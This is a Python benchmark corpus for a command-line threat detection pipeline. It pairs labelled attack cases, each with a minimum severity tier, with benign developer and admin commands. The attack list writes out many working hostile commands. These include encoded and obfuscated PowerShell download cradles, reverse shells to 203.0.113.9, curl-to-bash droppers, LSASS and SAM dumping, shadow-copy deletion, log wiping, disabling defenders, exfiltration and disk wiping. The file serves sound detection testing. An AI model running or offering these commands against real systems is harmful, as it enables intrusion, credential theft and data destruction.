"""Labelled benchmark corpus for the full detection pipeline.

Unlike tests/fixtures/*.json (which pin individual classifier rules), this
corpus measures the *product verdict* end to end: decode -> catalog match ->
classify -> score. It exists to answer two questions on every change:

  recall          — what share of hostile commands reach their minimum tier?
  false positives — what share of everyday commands exceed their maximum tier?

Each attack case names the weakest verdict an analyst should accept (`min`);
each benign case names the strongest verdict that is still reasonable (`max`).
Dual-use admin commands legitimately sit at "notable", so benign maxima are
"low" for plain developer work and "notable" for admin tooling.

Sources are public technique references, not live samples: MITRE ATT&CK
technique pages (attack.mitre.org/techniques/<id>), the LOLBAS project
(lolbas-project.github.io), GTFOBins (gtfobins.github.io), Red Canary's Atomic
Red Team tests (github.com/redcanaryco/atomic-red-team), The DFIR Report
intrusion write-ups (thedfirreport.com), and the reverse-shell cheat sheet at
github.com/swisskyrepo/PayloadsAllTheThings. All IPs are RFC 5737 / RFC 1918
documentation ranges.
"""

from __future__ import annotations

import base64
import gzip
from typing import NamedTuple


class Case(NamedTuple):
    id: str
    command: str
    tier: str      # attacks: minimum acceptable severity; benign: maximum
    source: str    # technique id / reference


def _ps_enc(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode()


def _b64(text: str) -> str:
    return base64.b64encode(text.encode()).decode()


def _gz_b64(text: str) -> str:
    return base64.b64encode(gzip.compress(text.encode(), mtime=0)).decode()


_CRADLE = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')"

# Tier policy: exfiltration with no other stage, and bare account creation, cap
# at "suspicious" — both are things administrators also do, so the verdict
# asks for a look rather than asserting malice.
ATTACKS: list[Case] = [
    # ── Windows: download / execute cradles ──────────────────────────────────
    Case("cs-stager", "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.10.14.3:80/a'))\"", "malicious", "T1059.001 Cobalt Strike stager"),
    Case("ps-tcp-revshell", "cmd.exe /c powershell -WindowStyle Hidden -Command \"$c=New-Object System.Net.Sockets.TCPClient('203.0.113.9',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$t=([text.encoding]::ASCII).GetBytes($sb);$s.Write($t,0,$t.Length)};$c.Close()\"", "malicious", "T1059.001 PayloadsAllTheThings"),
    Case("squiblydoo", "regsvr32 /s /n /u /i:http://203.0.113.9/file.sct scrobj.dll", "malicious", "T1218.010 LOLBAS Regsvr32"),
    Case("mshta-vbscript", 'mshta vbscript:Close(Execute("GetObject(""script:http://203.0.113.9/p.sct"")"))', "malicious", "T1218.005 LOLBAS Mshta"),
    Case("rundll32-js", 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://203.0.113.9/p.sct")', "malicious", "T1218.011 LOLBAS Rundll32"),
    Case("bitsadmin-transfer", r"bitsadmin /transfer myjob /download /priority high http://203.0.113.9/p.exe %APPDATA%\p.exe", "malicious", "T1197 LOLBAS Bitsadmin"),
    Case("certutil-chain", "certutil -urlcache -split -f http://203.0.113.9/p.b64 p.b64 & certutil -decode p.b64 p.exe & p.exe", "malicious", "T1105 LOLBAS Certutil"),
    Case("msiexec-remote", "msiexec /q /i http://203.0.113.9/p.msi", "malicious", "T1218.007 LOLBAS Msiexec"),
    Case("mshta-remote-hta", "mshta https://203.0.113.9/a.hta", "malicious", "T1218.005"),
    Case("curl-then-mshta", r'cmd /c "curl -k -o %TEMP%\a.hta https://203.0.113.9/a.hta && mshta %TEMP%\a.hta"', "malicious", "T1105 + T1218.005"),
    Case("ps-downloadfile-run", r"powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://203.0.113.9/p.exe','C:\Users\Public\p.exe');Start-Process 'C:\Users\Public\p.exe'\"", "malicious", "T1105"),
    Case("curl-dll-rundll32", r"curl.exe -s -o C:\Users\Public\p.dll http://203.0.113.9/p.dll && rundll32 C:\Users\Public\p.dll,Run", "malicious", "T1105 + T1218.011"),
    Case("clickfix-defanged", "powershell -w hidden -c \"$u='hxxps://example[.]top/x';iwr $u|iex\" # I am not a robot - reCAPTCHA ID 8841", "malicious", "T1204.004 ClickFix"),
    Case("ps-enc-cradle", "powershell -NoP -NonI -W Hidden -Enc " + _ps_enc(_CRADLE), "malicious", "T1027.010"),
    Case("ps-gzip-cradle", "powershell -nop -c \"IEX(New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String('" + _gz_b64(_CRADLE) + "'))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()\"", "malicious", "T1027.010 Cobalt Strike gzip loader"),
    Case("ps-double-enc", "powershell -e " + _ps_enc("powershell -nop -w hidden -enc " + _ps_enc(_CRADLE)), "malicious", "T1027 nested encoding"),
    Case("cmd-caret-certutil", "c^e^r^t^u^t^i^l -u^r^l^c^a^c^h^e -f http://203.0.113.9/p.exe p.exe", "malicious", "T1027 Invoke-DOSfuscation"),
    Case("cmd-quote-powershell", 'cmd /c po""wer""shell -nop -c "i""ex(irm http://203.0.113.9/a)"', "suspicious", "T1027 Invoke-DOSfuscation"),
    Case("cmd-set-concat", 'cmd /c "set a=cert&& set b=util&& call %a%%b% -urlcache -f http://203.0.113.9/p.exe %TEMP%\\p.exe"', "malicious", "T1027 Invoke-DOSfuscation"),
    Case("ps-backtick-cradle", "powershell -c \"I`E`X (N`e`w-O`b`j`e`c`t Net.WebClient).D`o`w`n`l`o`a`d`S`t`r`i`n`g('http://203.0.113.9/a')\"", "malicious", "T1027 Invoke-Obfuscation"),
    Case("ps-concat-iex", "powershell -c \"& ('I'+'E'+'X') (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a')\"", "malicious", "T1027 Invoke-Obfuscation"),
    Case("ps-shellid-iex", "powershell -c \".($ShellId[1]+$ShellId[13]+'x') (irm http://203.0.113.9/a)\"", "malicious", "T1027 Invoke-Obfuscation"),
    Case("ps-remote-script-unc", r"rundll32 \\203.0.113.9\share\p.dll,Entry", "suspicious", "T1218.011 remote DLL"),
    Case("esentutl-webdav", r"esentutl.exe /y \\203.0.113.9@80\dav\p.exe /d C:\ProgramData\p.exe /o", "suspicious", "T1105 LOLBAS Esentutl"),
    Case("ftp-script-dropper", 'cmd /c "echo open 203.0.113.9>f.txt&echo user a b>>f.txt&echo get p.exe>>f.txt&echo bye>>f.txt&ftp -n -s:f.txt&p.exe"', "suspicious", "T1105 LOLBAS Ftp"),
    Case("bitsadmin-notify", r"bitsadmin /create bd & bitsadmin /addfile bd http://203.0.113.9/p.exe C:\ProgramData\p.exe & bitsadmin /SetNotifyCmdLine bd C:\ProgramData\p.exe NULL & bitsadmin /resume bd", "suspicious", "T1197 Atomic Red Team"),
    # ── Windows: proxy execution from staging paths ──────────────────────────
    Case("forfiles-proxy", r'forfiles /p c:\windows\system32 /m notepad.exe /c "cmd /c C:\Users\Public\p.exe"', "suspicious", "T1202 LOLBAS Forfiles"),
    Case("cscript-staged", r"cscript //nologo //e:jscript C:\Users\Public\Documents\a.txt", "suspicious", "T1059.007"),
    Case("odbcconf-regsvr", r"odbcconf /a {REGSVR C:\Users\Public\p.dll}", "suspicious", "T1218.008 LOLBAS Odbcconf"),
    Case("cmstp-inf", r"cmstp.exe /ni /s C:\Users\Public\p.inf", "suspicious", "T1218.003 LOLBAS Cmstp"),
    Case("msbuild-temp-proj", r"msbuild.exe C:\Windows\Temp\build.csproj", "suspicious", "T1127.001 LOLBAS Msbuild"),
    Case("wscript-appdata", r"wscript.exe //B //E:vbscript C:\Users\victim\AppData\Local\Temp\inv.vbs", "suspicious", "T1059.005"),
    Case("start-process-public", r"powershell.exe -c \"Start-Process C:\Users\Public\p.exe -WindowStyle Hidden\"", "suspicious", "T1204.002 staged binary"),
    Case("masquerade-svchost", r"cmd.exe /c start /b C:\ProgramData\svchost.exe", "suspicious", "T1036.005"),
    Case("regsvr32-appdata", r"regsvr32.exe /s C:\Users\victim\AppData\Roaming\upd.dll", "suspicious", "T1218.010 Qakbot"),
    # ── Windows: persistence ─────────────────────────────────────────────────
    Case("run-key", r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Users\Public\upd.exe" /f', "malicious", "T1547.001"),
    Case("schtasks-ps", r'schtasks /create /sc minute /mo 5 /tn "OneDriveSync" /tr "powershell -w hidden -ep bypass -f C:\ProgramData\s.ps1"', "suspicious", "T1053.005"),
    Case("sc-create", r'sc create evilsvc binPath= "cmd /c C:\Windows\Temp\x.exe" start= auto', "malicious", "T1543.003"),
    Case("ifeo-sethc", r'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f', "malicious", "T1546.012"),
    Case("sticky-keys-copy", r"copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe /y", "suspicious", "T1546.008"),
    Case("winlogon-userinit-ps", r"powershell -c \"Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name Userinit -Value 'C:\Windows\system32\userinit.exe,C:\Users\Public\p.exe'\"", "suspicious", "T1547.004"),
    Case("wmi-eventfilter", r'wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="f", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"', "malicious", "T1546.003"),
    Case("net-user-add-domain", "net user support$ P@ss123! /add /domain", "suspicious", "T1136.002"),
    Case("net-localgroup-rdp", 'net localgroup "Remote Desktop Users" support$ /add', "malicious", "T1098"),
    Case("fodhelper-uac", r'reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd /c C:\Users\Public\p.exe" /f & fodhelper.exe', "malicious", "T1548.002"),
    Case("rmm-screenconnect", r'msiexec /i C:\ProgramData\ScreenConnect.ClientSetup.msi /qn', "suspicious", "T1219 DFIR Report"),
    # ── Windows: credential access ───────────────────────────────────────────
    Case("procdump-lsass", "procdump.exe -accepteula -ma lsass.exe lsass.dmp", "malicious", "T1003.001"),
    Case("comsvcs-minidump", r"rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full", "malicious", "T1003.001"),
    Case("reg-save-sam", r"reg save HKLM\SAM C:\Windows\Temp\sam.save", "malicious", "T1003.002"),
    Case("ntdsutil-ifm", r'ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q', "malicious", "T1003.003"),
    Case("mimikatz-logonpw", 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit', "malicious", "T1003.001"),
    Case("rubeus-kerberoast", "Rubeus.exe kerberoast /outfile:hashes.txt", "malicious", "T1558.003"),
    Case("impacket-secretsdump", "impacket-secretsdump -just-dc-ntlm corp.local/admin@10.0.0.10", "malicious", "T1003.006"),
    Case("nxc-spray", "netexec smb 10.0.0.0/24 -u users.txt -p 'Spring2025!' --continue-on-success", "suspicious", "T1110.003"),
    Case("pth-evilwinrm", "evil-winrm -i 10.0.0.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0", "malicious", "T1550.002"),
    Case("keyfile-hunt", r"powershell -c \"Get-ChildItem C:\Users -Recurse -Include *.kdbx,*.pfx,*id_rsa* -ErrorAction SilentlyContinue\"", "notable", "T1552.001"),
    Case("browser-logindata", r'copy "C:\Users\victim\AppData\Local\Google\Chrome\User Data\Default\Login Data" C:\ProgramData\ld.db', "suspicious", "T1555.003"),
    # ── Windows: lateral movement ────────────────────────────────────────────
    Case("psexec-remote", r"PsExec.exe \\10.0.0.5 -u corp\admin -p Passw0rd -s cmd.exe", "suspicious", "T1021.002"),
    Case("wmic-node-create", r'wmic /node:"10.0.0.12" /user:"corp\admin" /password:"x" process call create "cmd /c C:\Windows\Temp\b.exe"', "malicious", "T1047"),
    Case("icm-remote-cradle", "Invoke-Command -ComputerName dc01 -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a') }", "malicious", "T1021.006"),
    Case("copy-admin-share", r"copy C:\ProgramData\p.exe \\10.0.0.12\ADMIN$\p.exe", "suspicious", "T1570"),
    Case("net-use-cshare", r"net use \\10.0.0.5\C$ /user:corp\admin Passw0rd", "notable", "T1021.002"),
    Case("enable-rdp", r'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f', "notable", "T1021.001"),
    # ── Windows: defense evasion ─────────────────────────────────────────────
    Case("amsi-reflection", "powershell -ep bypass -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"", "malicious", "T1562.001"),
    Case("defender-exclusion", r"powershell Add-MpPreference -ExclusionPath C:\Users\Public", "malicious", "T1562.001"),
    Case("firewall-off", "netsh advfirewall set allprofiles state off", "malicious", "T1562.004"),
    Case("wevtutil-cl", "wevtutil cl Security", "malicious", "T1070.001"),
    Case("wevtutil-loop", "cmd /c \"for /F \"tokens=*\" %1 in ('wevtutil.exe el') DO wevtutil.exe cl \"%1\"\"", "malicious", "T1070.001"),
    Case("ps-clearlog-api", "powershell -c \"Get-WinEvent -ListLog * | ForEach-Object { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) }\"", "suspicious", "T1070.001"),
    Case("kill-defender-proc", "taskkill /f /im MsMpEng.exe", "suspicious", "T1562.001"),
    Case("sc-disable-defender", "sc stop WinDefend && sc config WinDefend start= disabled", "malicious", "T1562.001"),
    Case("certutil-encode-loot", r"certutil -encode C:\temp\loot.zip C:\temp\loot.txt", "notable", "T1027"),
    # ── Windows: impact ──────────────────────────────────────────────────────
    Case("vssadmin-delete", "vssadmin.exe delete shadows /all /quiet", "malicious", "T1490"),
    Case("wmic-shadowcopy", "wmic shadowcopy delete", "malicious", "T1490"),
    Case("bcdedit-recovery", "bcdedit /set {default} recoveryenabled No", "malicious", "T1490"),
    Case("ps-shadowcopy-delete", "powershell -c \"Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}\"", "malicious", "T1490"),
    Case("vssadmin-resize", "vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB", "malicious", "T1490"),
    Case("wbadmin-delete", "wbadmin delete catalog -quiet", "malicious", "T1490"),
    Case("icacls-everyone", r'icacls "C:\*" /grant Everyone:F /T /C /Q', "notable", "T1222.001"),
    Case("net-stop-veeam", 'net stop "Veeam Backup Service" /y', "malicious", "T1489"),
    # ── Windows: discovery / exfil ───────────────────────────────────────────
    Case("recon-burst", "whoami /all & net user & net localgroup administrators & systeminfo & ipconfig /all & tasklist /svc", "notable", "T1087 hands-on-keyboard discovery"),
    Case("nltest-trusts", "nltest /domain_trusts /all_trusts", "notable", "T1482"),
    Case("adfind-computers", 'AdFind.exe -f "(objectcategory=computer)" > ad_computers.txt', "notable", "T1018"),
    Case("sharphound-all", "SharpHound.exe -c All --zipfilename loot.zip", "notable", "T1087.002"),
    Case("powerview-remote", "powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'); Get-DomainUser -SPN\"", "malicious", "T1087.002"),
    Case("7z-password-share", r"7z a -pInfected123 -mhe=on C:\ProgramData\d.7z \\fileserver\finance\*", "suspicious", "T1560.001"),
    Case("rclone-share", r'rclone.exe copy \\fs01\share remote:exfil --max-age 2y -q', "suspicious", "T1567.002"),
    Case("curl-transfer-sh", r'curl -F "file=@C:\Users\Public\loot.zip" https://transfer.sh/', "malicious", "T1567"),
    Case("discord-webhook-upload", r"powershell -c \"Invoke-WebRequest -Uri https://discord.com/api/webhooks/1/abc -Method POST -InFile C:\temp\creds.txt\"", "suspicious", "T1567.004"),
    # ── Linux / macOS: shells & droppers ─────────────────────────────────────
    Case("bash-devtcp", "bash -c 'exec bash -i &>/dev/tcp/203.0.113.9/9001 <&1'", "malicious", "T1059.004"),
    Case("python-revshell", "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"203.0.113.9\",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "malicious", "T1059.006"),
    Case("ncat-e", "ncat 203.0.113.9 9001 -e /bin/bash", "malicious", "T1059.004"),
    Case("php-fsockopen", "php -r '$sock=fsockopen(\"203.0.113.9\",9001);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", "malicious", "T1059"),
    Case("socat-exec", "socat TCP:203.0.113.9:9001 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane", "malicious", "T1059.004"),
    Case("curl-pipe-bash", "curl -fsSL http://203.0.113.9/i.sh | bash", "malicious", "T1059.004"),
    Case("wget-pipe-sh", "wget -qO- http://203.0.113.9/i.sh | sh", "malicious", "T1059.004"),
    Case("mirai-dropper", "cd /tmp && wget http://203.0.113.9/bot.arm7 && chmod 777 bot.arm7 && ./bot.arm7 telnet", "malicious", "T1105 Mirai"),
    Case("teamtnt-chain", "(curl -fsSL http://203.0.113.9/xms||wget -q -O- http://203.0.113.9/xms)|bash -sh; bash /tmp/xms; rm -rf /tmp/xms", "malicious", "T1105 TeamTNT"),
    Case("devshm-dropper", "curl http://203.0.113.9/lin -o /dev/shm/.l; chmod +x /dev/shm/.l; /dev/shm/.l &", "malicious", "T1105"),
    Case("b64-pipe-bash", "echo " + _b64("bash -i >& /dev/tcp/203.0.113.9/9001 0>&1") + " | base64 -d | bash", "malicious", "T1027"),
    Case("python-urlopen-exec", "python -c \"import urllib.request;exec(urllib.request.urlopen('http://203.0.113.9/s.py').read())\"", "malicious", "T1059.006"),
    Case("macos-amos-chain", "curl -o /tmp/update https://203.0.113.9/update && xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update", "malicious", "T1553.001 AMOS stealer"),
    Case("macos-osascript-phish", "osascript -e 'display dialog \"System Preferences needs your password\" default answer \"\" with hidden answer'", "suspicious", "T1056.002"),
    Case("macos-keychain-dump", "security dump-keychain -d ~/Library/Keychains/login.keychain-db", "suspicious", "T1555.001"),
    # ── Linux: persistence / privesc ─────────────────────────────────────────
    Case("etc-crontab", "echo \"*/5 * * * * root curl -fsSL http://203.0.113.9/c.sh | sh\" >> /etc/crontab", "malicious", "T1053.003"),
    Case("authorized-keys", "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExample user@host' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys", "suspicious", "T1098.004"),
    Case("useradd-uid0", "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupdate; echo 'sysupdate:Pass123' | chpasswd", "malicious", "T1136.001"),
    Case("suid-bash", "cp /bin/bash /tmp/.rootbash; chmod 4755 /tmp/.rootbash", "malicious", "T1548.001"),
    Case("sudo-find-shell", r"sudo find . -exec /bin/sh \; -quit", "malicious", "T1548.003 GTFOBins find"),
    Case("sudo-vim-shell", "sudo vim -c ':!/bin/sh'", "malicious", "T1548.003 GTFOBins vim"),
    Case("crontab-reboot", "crontab -r; echo \"@reboot /var/tmp/.sys\" | crontab -", "malicious", "T1053.003"),
    Case("ld-so-preload", "echo '/tmp/.lib.so' >> /etc/ld.so.preload", "malicious", "T1574.006"),
    Case("ld-preload-env", "LD_PRELOAD=/tmp/libhide.so /usr/sbin/sshd", "notable", "T1574.006"),
    Case("docker-nsenter", "docker run --rm -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh", "malicious", "T1611"),
    Case("k8s-sa-token", "kubectl exec -it pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token", "notable", "T1552.007"),
    Case("launchagent-load", "launchctl load -w ~/Library/LaunchAgents/com.apple.updater.plist", "notable", "T1543.001"),
    # ── Linux: creds / exfil / evasion / impact ──────────────────────────────
    Case("shadow-to-nc", "cat /etc/shadow | nc 203.0.113.9 8000", "malicious", "T1003.008"),
    Case("imds-creds", "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/", "malicious", "T1552.005"),
    Case("tar-pipe-curl", "tar czf - /home /etc 2>/dev/null | curl -X POST --data-binary @- http://203.0.113.9/up", "suspicious", "T1048"),
    Case("ssh-remote-forward", "ssh -N -R 2222:localhost:22 user@203.0.113.9", "suspicious", "T1572"),
    Case("chisel-socks", "chisel client 203.0.113.9:8080 R:socks", "suspicious", "T1572"),
    Case("log-wipe", "history -c; echo > /var/log/auth.log; rm -rf /var/log/*.gz", "malicious", "T1070.002"),
    Case("stop-falcon", "systemctl stop falcon-sensor && systemctl disable falcon-sensor", "malicious", "T1562.001"),
    Case("histfile-null", "export HISTFILE=/dev/null; unset HISTFILE", "malicious", "T1070.003"),
    Case("firewall-flush", "iptables -F; iptables -X; ufw disable", "notable", "T1562.004"),
    Case("xmrig-pool", "nohup ./xmrig -o stratum+tcp://pool.example.org:3333 -u 4AExampleWallet -p x --donate-level 1 >/dev/null 2>&1 &", "malicious", "T1496"),
    Case("openssl-encrypt-shred", "openssl enc -aes-256-cbc -salt -in /srv/data.tar -out /srv/data.tar.enc -k Secret && shred -u /srv/data.tar", "notable", "T1486"),
    Case("dd-wipe", "dd if=/dev/zero of=/dev/sda bs=1M", "malicious", "T1561.001"),
    Case("rm-rf-root", "rm -rf / --no-preserve-root", "malicious", "T1485"),
    Case("nmap-sweep", "nmap -sS -p- -T4 10.0.0.0/24 -oA scan", "low", "T1046"),
]

BENIGN: list[Case] = [
    # ── Developer workflow ───────────────────────────────────────────────────
    Case("git-clone", "git clone https://github.com/torvalds/linux.git", "low", "dev"),
    Case("git-push-force", "git push origin main --force-with-lease", "low", "dev"),
    Case("npm-build-test", "npm run build && npm test", "low", "dev"),
    Case("pip-upgrade", "pip install --upgrade pip setuptools wheel", "low", "dev"),
    Case("django-migrate", "python manage.py migrate", "low", "dev"),
    Case("docker-build", "docker build -t app:latest .", "low", "dev"),
    Case("docker-run-nginx", "docker run -d -p 8080:80 -v $(pwd)/html:/usr/share/nginx/html nginx", "low", "dev"),
    Case("docker-exec", "docker exec -it web bash", "low", "dev"),
    Case("docker-run-node", 'docker run --rm -v "$PWD":/app -w /app node:20 npm ci', "low", "dev"),
    Case("kubectl-apply", "kubectl apply -f deployment.yaml", "low", "dev"),
    Case("terraform-plan", "terraform plan -out=tfplan", "low", "dev"),
    Case("dotnet-build", "dotnet build -c Release", "low", "dev"),
    Case("msbuild-sln", "msbuild MySolution.sln /p:Configuration=Release", "low", "dev"),
    Case("cargo-build", "cargo build --release", "low", "dev"),
    Case("go-test", "go test ./...", "low", "dev"),
    Case("make-j", "make -j8", "low", "dev"),
    Case("mvn-install", "mvn clean install", "low", "dev"),
    Case("grep-todo", 'grep -r "TODO" src/ --include=*.py', "low", "dev"),
    Case("find-old-logs", 'find . -name "*.log" -mtime +7 -delete', "low", "dev"),
    Case("tar-extract", "tar -xzf node-v20.tar.gz -C /usr/local", "low", "dev"),
    Case("curl-github-api", "curl -s https://api.github.com/repos/python/cpython/releases/latest", "low", "dev"),
    Case("curl-json-post", "curl -X POST https://api.example.com/v1/items -H \"Content-Type: application/json\" -d '{\"name\":\"x\"}'", "low", "dev"),
    Case("wget-iso", "wget https://releases.ubuntu.com/24.04/ubuntu-24.04-desktop-amd64.iso", "low", "dev"),
    Case("python-http-server", "python3 -m http.server 8000", "low", "dev"),
    Case("python-json-oneliner", "python -c \"import json,sys; print(json.load(sys.stdin)['version'])\"", "low", "dev"),
    Case("chmod-run-script", "chmod +x deploy.sh && ./deploy.sh", "low", "dev"),
    Case("chmod-755", "chmod 755 /usr/local/bin/tool", "low", "dev"),
    Case("rm-node-modules", "rm -rf node_modules dist", "low", "dev"),
    Case("rm-tmp-cache", "rm -rf /tmp/build-cache", "low", "dev"),
    Case("dd-usb-image", "dd if=ubuntu.iso of=/dev/sdb bs=4M status=progress", "low", "dev"),
    Case("rsync-deploy", "rsync -avz ./site/ deploy@web01:/var/www/site/", "low", "dev"),
    Case("scp-report", "scp report.pdf user@server:/home/user/", "low", "dev"),
    Case("ssh-keygen", 'ssh-keygen -t ed25519 -C "me@example.com"', "low", "dev"),
    Case("ssh-copy-id", "ssh-copy-id user@server", "low", "dev"),
    Case("ssh-local-forward", "ssh -L 5432:localhost:5432 bastion", "notable", "dev"),
    Case("openssl-s-client", "openssl s_client -connect example.com:443 -servername example.com", "low", "dev"),
    Case("openssl-selfsigned", "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes", "low", "dev"),
    Case("base64-decode-file", "base64 -d secret.b64 > secret.bin", "low", "dev"),
    Case("echo-b64-hello", 'echo "aGVsbG8gd29ybGQ=" | base64 -d', "notable", "dev"),
    Case("nc-port-check", "nc -zv db.internal 5432", "low", "dev"),
    Case("bashrc-path", 'echo "export PATH=$PATH:/usr/local/go/bin" >> ~/.bashrc', "notable", "dev"),
    Case("code-dot", "code .", "low", "dev"),
    Case("meet-at", "echo meet at 10:30 tomorrow", "low", "regression: at.exe rule"),
    # ── Known installer one-liners ───────────────────────────────────────────
    Case("rustup", "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh", "notable", "rustup.rs"),
    Case("homebrew", '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"', "notable", "brew.sh"),
    Case("chocolatey", "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))", "notable", "chocolatey.org/install"),
    Case("scoop", "Invoke-RestMethod -Uri https://get.scoop.sh | Invoke-Expression", "notable", "scoop.sh"),
    Case("uv-install", "curl -LsSf https://astral.sh/uv/install.sh | sh", "notable", "docs.astral.sh/uv"),
    Case("get-docker", "curl -fsSL https://get.docker.com -o get-docker.sh && sh get-docker.sh", "notable", "docs.docker.com"),
    # ── Linux admin ──────────────────────────────────────────────────────────
    Case("apt-upgrade", "sudo apt update && sudo apt upgrade -y", "low", "admin"),
    Case("sudo-vim-conf", "sudo vim /etc/nginx/nginx.conf", "low", "admin"),
    Case("systemctl-restart", "systemctl restart nginx", "low", "admin"),
    Case("systemctl-status", "systemctl status sshd", "low", "admin"),
    Case("journalctl", 'journalctl -u nginx --since "1 hour ago"', "low", "admin"),
    Case("crontab-list", "crontab -l", "low", "admin"),
    Case("crontab-edit", "crontab -e", "low", "admin"),
    Case("history-grep", "history | grep ssh", "low", "admin"),
    Case("ps-aux", "ps aux | grep nginx", "low", "admin"),
    Case("netstat-tulpn", "netstat -tulpn", "low", "admin"),
    Case("ping", "ping -c 4 8.8.8.8", "low", "admin"),
    Case("dig-mx", "dig +short example.com MX", "low", "admin"),
    Case("iptables-list", "iptables -L -n -v", "low", "admin"),
    Case("useradd-plain", "useradd -m -s /bin/bash alice", "low", "admin"),
    Case("usermod-docker", "usermod -aG docker alice", "low", "admin"),
    Case("cat-hosts", "cat /etc/hosts", "low", "admin"),
    Case("ls-ssh", "ls -la ~/.ssh", "low", "admin"),
    Case("tcpdump-dns", "tcpdump -i any -nn port 53", "notable", "admin"),
    Case("aws-s3-cp", "aws s3 cp build.zip s3://company-artifacts/builds/", "notable", "admin"),
    Case("gcloud-list", "gcloud compute instances list", "low", "admin"),
    # ── Windows admin ────────────────────────────────────────────────────────
    Case("ipconfig-flushdns", "ipconfig /flushdns", "low", "admin"),
    Case("ping-win", "ping -n 4 10.0.0.1", "low", "admin"),
    Case("netstat-findstr", "netstat -ano | findstr :8080", "low", "admin"),
    Case("tasklist-findstr", "tasklist | findstr chrome", "low", "admin"),
    Case("taskkill-chrome", "taskkill /f /im chrome.exe", "low", "admin"),
    Case("sfc", "sfc /scannow", "low", "admin"),
    Case("dism", "DISM /Online /Cleanup-Image /RestoreHealth", "low", "admin"),
    Case("gpupdate", "gpupdate /force", "low", "admin"),
    Case("net-use-drive", r"net use Z: \\fileserver\share /persistent:yes", "low", "admin"),
    Case("net-stop-spooler", "net stop spooler", "low", "admin"),
    Case("sc-query", "sc query wuauserv", "low", "admin"),
    Case("shutdown", "shutdown /r /t 0", "low", "admin"),
    Case("robocopy-mirror", r"robocopy C:\Data D:\Backup /MIR /R:2 /W:5", "low", "admin"),
    Case("ps-get-service", "powershell Get-Service | Where-Object {$_.Status -eq 'Running'}", "low", "admin"),
    Case("ps-bypass-file", r"powershell -ExecutionPolicy Bypass -File .\build.ps1", "notable", "admin"),
    Case("ps-measure", 'powershell -NoProfile -Command "Get-ChildItem -Recurse | Measure-Object -Property Length -Sum"', "low", "admin"),
    Case("get-eventlog", "Get-EventLog -LogName System -Newest 50", "low", "admin"),
    Case("get-aduser-export", "Get-ADUser -Filter * -Properties LastLogonDate | Export-Csv users.csv", "low", "admin"),
    Case("install-module", "Install-Module -Name Az -Scope CurrentUser", "low", "admin"),
    Case("iwr-pdf", "Invoke-WebRequest -Uri https://example.com/report.pdf -OutFile report.pdf", "low", "admin"),
    Case("irm-health", "Invoke-RestMethod -Uri https://api.example.com/health", "low", "admin"),
    Case("winget", "winget install Microsoft.VisualStudioCode", "low", "admin"),
    Case("choco-install", "choco install git -y", "low", "admin"),
    Case("msiexec-downloads", r'msiexec /i "C:\Users\me\Downloads\7z2301-x64.msi" /qn', "low", "admin"),
    Case("regsvr32-progfiles", r'regsvr32 /s "C:\Program Files\App\component.dll"', "low", "admin"),
